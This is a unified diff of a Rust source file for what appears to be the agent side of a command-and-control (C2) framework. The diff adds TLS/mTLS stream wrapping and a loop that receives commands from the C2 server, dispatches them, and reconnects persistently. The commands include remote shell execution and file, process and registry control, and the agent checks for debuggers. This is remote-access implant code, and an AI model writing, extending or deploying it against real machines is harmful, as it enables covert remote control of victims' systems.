@@ -1,9 +1,12 @@
 use agent_hardening::anti_debug;
 use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
 use crypto::tls::{build_tls_connector, load_certs, load_private_key, TlsError};
+use protocol::framing::{self, FramingError};
 use protocol::messages::{Command, Response};
 use std::net::SocketAddr;
+use std::sync::Arc;
 use std::time::Duration;
+use tokio::io::{AsyncRead, AsyncWrite};
 use tokio::net::TcpStream;
 use tokio::time;
 use tokio_rustls::TlsConnector;
@@ -43,12 +46,12 @@ pub enum ConnectionMode {
     Plain,
     /// Connect with TLS but no client certificate.
     Tls {
-        connector: std::sync::Arc<TlsConnector>,
+        connector: Arc<TlsConnector>,
         server_name: String,
     },
     /// Connect with mTLS (client certificate presented).
     Mtls {
-        connector: std::sync::Arc<TlsConnector>,
+        connector: Arc<TlsConnector>,
         server_name: String,
     },
 }
@@ -92,7 +95,7 @@ impl AgentCore {
             id,
             config: ConnectionConfig::default(),
             connection_mode: ConnectionMode::Tls {
-                connector: std::sync::Arc::new(connector),
+                connector: Arc::new(connector),
                 server_name: server_name.to_string(),
             },
         })
@@ -119,53 +122,36 @@ impl AgentCore {
             id,
             config: ConnectionConfig::default(),
             connection_mode: ConnectionMode::Mtls {
-                connector: std::sync::Arc::new(connector),
+                connector: Arc::new(connector),
                 server_name: server_name.to_string(),
             },
         })
     }
 
-    /// Connect to a C2 server at the given address.
+    /// Upgrade a raw TCP stream to TLS if configured.
     ///
-    /// If TLS/mTLS is configured, the TCP stream is wrapped before returning.
-    pub async fn connect(&self, addr: &SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
-        let stream = TcpStream::connect(addr).await?;
-        log::info!("Agent {} connected to {addr}", self.id);
-
-        // Extract the Arc<Connector> and name before the .await boundary.
-        let (connector_opt, server_name) = match &self.connection_mode {
-            ConnectionMode::Tls {
-                connector,
-                server_name,
+    /// Returns an opaque handle that can be split into reader/writer halves.
+    async fn maybe_wrap_tcp(&self, stream: TcpStream) -> Result<WrappedStream, Box<dyn std::error::Error>> {
+        match &self.connection_mode {
+            ConnectionMode::Plain => Ok(WrappedStream::Plain(stream)),
+            ConnectionMode::Tls { connector, server_name }
+            | ConnectionMode::Mtls { connector, server_name } => {
+                let name: rustls_pki_types::ServerName<'static> = server_name
+                    .clone()
+                    .try_into()
+                    .map_err(|_| "invalid DNS name for TLS")?;
+                let tls_stream = connector.connect(name, stream).await?;
+                log::info!("TLS handshake completed for agent {}", self.id);
+                Ok(WrappedStream::Tls(tls_stream))
             }
-            | ConnectionMode::Mtls {
-                connector,
-                server_name,
-            } => (Some(std::sync::Arc::clone(connector)), Some(server_name.clone())),
-            ConnectionMode::Plain => (None, None),
-        };
-
-        if let (Some(connector), Some(name_str)) = (connector_opt, server_name) {
-            let owned_name: String = name_str;
-            let name: rustls_pki_types::ServerName<'static> = owned_name
-                .try_into()
-                .map_err(|_| "invalid DNS name")?;
-            let _tls_stream = connector.connect(name, stream).await?;
-            log::info!("TLS handshake completed for agent {}", self.id);
-        } else {
-            log::info!("Agent {} connected in cleartext mode", self.id);
         }
-
-        Ok(())
     }
 
-    /// Run the agent loop: connect to C2, send heartbeats, and reconnect on failure.
-    ///
-    /// Enterprise use: the agent maintains a persistent connection to
-    /// the management server with automatic reconnection and backoff.
+    /// Run the agent loop: connect to C2, send heartbeats, process commands,
+    /// and reconnect on failure with exponential backoff.
     pub async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
         loop {
-            match self.connect_and_run_heartbeats().await {
+            match self.connect_and_listen().await {
                 Ok(()) => {
                     log::info!("Agent {} disconnected cleanly", self.id);
                 }
@@ -174,7 +160,7 @@ impl AgentCore {
                 }
             }
 
-            // Reconnect with exponential backoff
+            // Reconnect with exponential backoff.
             let mut delay = self.config.reconnect_base_delay;
             loop {
                 log::info!(
@@ -204,23 +190,84 @@ impl AgentCore {
         }
     }
 
-    /// Connect to the C2 server and run the heartbeat loop.
-    async fn connect_and_run_heartbeats(&self) -> Result<(), Box<dyn std::error::Error>> {
-        let _stream = TcpStream::connect(&self.config.server_addr).await?;
+    /// Connect to the C2, split the stream, and run the heartbeat + command
+    /// loop until the connection drops.
+    async fn connect_and_listen(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let raw_stream = TcpStream::connect(&self.config.server_addr).await?;
         log::info!("Agent {} connected to {}", self.id, self.config.server_addr);
 
-        self.run_heartbeat_loop().await
+        let stream = self.maybe_wrap_tcp(raw_stream).await?;
+        let (mut reader, mut writer) = stream.split();
+
+        self.run_agent_loop(&mut reader, &mut writer).await
     }
 
-    /// Send heartbeats to the C2 server at the configured interval.
-    async fn run_heartbeat_loop(&self) -> Result<(), Box<dyn std::error::Error>> {
+    /// Main loop: select between heartbeat ticks and incoming C2 commands.
+    ///
+    /// On every heartbeat tick, send a `Heartbeat` command to the C2.
+    /// On every received message, deserialize it as a `Command` and
+    /// dispatch through `handle_command`, sending the response back.
+    async fn run_agent_loop<R, W>(
+        &self,
+        reader: &mut R,
+        writer: &mut W,
+    ) -> Result<(), Box<dyn std::error::Error>>
+    where
+        R: AsyncRead + Unpin + Send,
+        W: AsyncWrite + Unpin + Send,
+    {
         let mut interval = time::interval(Duration::from_secs(self.config.heartbeat_interval));
         interval.tick().await; // skip the first immediate tick
 
         loop {
-            interval.tick().await;
-            let response = self.heartbeat().await;
-            log::info!("Agent {} heartbeat: {response:?}", self.id);
+            tokio::select! {
+                _ = interval.tick() => {
+                    // Send a Heartbeat command to the C2.
+                    if let Err(e) = framing::write_message(writer, &Command::Heartbeat).await {
+                        log::error!("Agent {} heartbeat write failed: {e}", self.id);
+                        return Err(e.into());
+                    }
+                    log::debug!("Agent {} heartbeat sent", self.id);
+                }
+                result = framing::read_message::<Command, R>(reader) => {
+                    match result {
+                        Ok(cmd) => {
+                            log::info!("Agent {} received command: {:?}", self.id, cmd);
+
+                            // Report debugger presence as a security event.
+                            if anti_debug::is_being_debugged() {
+                                log::warn!("Security: agent process appears to be under debugging");
+                            }
+
+                            // The C2 sends Heartbeat as a keep-alive check.
+                            // Respond with Success rather than dispatching to handle_command.
+                            let response = match &cmd {
+                                Command::Heartbeat => Response::HeartbeatAck,
+                                other => self.handle_command(other).await.unwrap_or_else(|| {
+                                    Response::Failure { error: "no handler for command".into() }
+                                }),
+                            };
+
+                            if let Err(e) = framing::write_message(writer, &response).await {
+                                log::error!("Agent {} failed to send response: {e}", self.id);
+                                return Err(e.into());
+                            }
+                        }
+                        Err(FramingError::Io(e)) => {
+                            // Connection closed or I/O error — exit so we reconnect.
+                            log::info!("Agent {} connection closed: {e}", self.id);
+                            return Err(e.into());
+                        }
+                        Err(e) => {
+                            log::error!("Agent {} framing error: {e}", self.id);
+                            // Send a failure response and continue.
+                            let _ = framing::write_message(writer, &Response::Failure {
+                                error: format!("protocol error: {e}"),
+                            }).await;
+                        }
+                    }
+                }
+            }
         }
     }
 
@@ -230,11 +277,6 @@ impl AgentCore {
     /// Unknown or unregistered commands are rejected with a Failure
     /// response.
     pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
-        // Report debugger presence as a security event.
-        if anti_debug::is_being_debugged() {
-            log::warn!("Security: agent process appears to be under debugging");
-        }
-
         match cmd {
             cmd @ Command::Execute { .. } => {
                 if let Command::Execute { cmd: raw } = cmd {
@@ -256,13 +298,97 @@ impl AgentCore {
                 }
             }
             Command::GetSysInfo => monitoring::get_sysinfo().await,
-            Command::Heartbeat => Some(Response::Success),
+            Command::Heartbeat => Some(Response::HeartbeatAck),
         }
     }
 
     /// Generate a heartbeat response.
     pub async fn heartbeat(&self) -> Response {
-        Response::Success
+        Response::HeartbeatAck
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Wrapped stream — allows the agent to work with plain TCP or TLS
+// transparently.
+// ---------------------------------------------------------------------------
+
+enum WrappedStream {
+    Plain(TcpStream),
+    Tls(tokio_rustls::client::TlsStream<TcpStream>),
+}
+
+impl WrappedStream {
+    /// Split into reader and writer halves that implement AsyncRead + AsyncWrite
+    /// independently, so `run_agent_loop` can hold them in separate variables
+    /// and pass them to `tokio::select!`.
+    fn split(self) -> (ReadHalf, WriteHalf) {
+        match self {
+            WrappedStream::Plain(s) => {
+                let (r, w) = tokio::io::split(s);
+                (ReadHalf::Plain(r), WriteHalf::Plain(w))
+            }
+            WrappedStream::Tls(s) => {
+                let (r, w) = tokio::io::split(s);
+                (ReadHalf::Tls(r), WriteHalf::Tls(w))
+            }
+        }
+    }
+}
+
+pub enum ReadHalf {
+    Plain(tokio::io::ReadHalf<TcpStream>),
+    Tls(tokio::io::ReadHalf<tokio_rustls::client::TlsStream<TcpStream>>),
+}
+
+impl AsyncRead for ReadHalf {
+    fn poll_read(
+        self: std::pin::Pin<&mut Self>,
+        cx: &mut std::task::Context<'_>,
+        buf: &mut tokio::io::ReadBuf<'_>,
+    ) -> std::task::Poll<std::io::Result<()>> {
+        match self.get_mut() {
+            Self::Plain(ref mut r) => std::pin::Pin::new(r).poll_read(cx, buf),
+            Self::Tls(ref mut r) => std::pin::Pin::new(r).poll_read(cx, buf),
+        }
+    }
+}
+
+pub enum WriteHalf {
+    Plain(tokio::io::WriteHalf<TcpStream>),
+    Tls(tokio::io::WriteHalf<tokio_rustls::client::TlsStream<TcpStream>>),
+}
+
+impl AsyncWrite for WriteHalf {
+    fn poll_write(
+        self: std::pin::Pin<&mut Self>,
+        cx: &mut std::task::Context<'_>,
+        buf: &[u8],
+    ) -> std::task::Poll<Result<usize, std::io::Error>> {
+        match self.get_mut() {
+            Self::Plain(ref mut w) => std::pin::Pin::new(w).poll_write(cx, buf),
+            Self::Tls(ref mut w) => std::pin::Pin::new(w).poll_write(cx, buf),
+        }
+    }
+
+    fn poll_flush(
+        self: std::pin::Pin<&mut Self>,
+        cx: &mut std::task::Context<'_>,
+    ) -> std::task::Poll<Result<(), std::io::Error>> {
+        match self.get_mut() {
+            Self::Plain(ref mut w) => std::pin::Pin::new(w).poll_flush(cx),
+            Self::Tls(ref mut w) => std::pin::Pin::new(w).poll_flush(cx),
+        }
+    }
+
+    fn poll_shutdown(
+        self: std::pin::Pin<&mut Self>,
+        cx: &mut std::task::Context<'_>,
+    ) -> std::task::Poll<Result<(), std::io::Error>> {
+        match self.get_mut() {
+            Self::Plain(ref mut w) => std::pin::Pin::new(w).poll_shutdown(cx),
+            Self::Tls(ref mut w) => std::pin::Pin::new(w).poll_shutdown(cx),
+        }
     }
 }
 
@@ -284,10 +410,10 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn heartbeat_returns_success() {
+    async fn heartbeat_returns_ack() {
         let agent = AgentCore::new(1);
         let response = agent.heartbeat().await;
-        assert_eq!(response, Response::Success);
+        assert_eq!(response, Response::HeartbeatAck);
     }
 
     #[test]
